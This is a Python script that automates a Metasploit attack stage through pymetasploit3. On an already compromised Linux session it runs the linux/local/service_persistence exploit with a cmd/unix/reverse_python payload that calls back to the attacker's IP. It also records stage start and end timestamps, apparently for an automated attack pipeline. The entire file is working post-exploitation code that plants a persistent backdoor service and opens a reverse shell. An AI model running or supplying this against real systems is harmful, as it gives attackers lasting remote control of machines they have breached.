import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    exploit['SESSION'] = 2
    exploit['VERBOSE'] = True
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    client.sessions.session('1').stop()
    client.sessions.session('2').stop()
    client.sessions.session('3').stop()

    time.sleep(10)
    output_time_file = 'time_stage_2_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
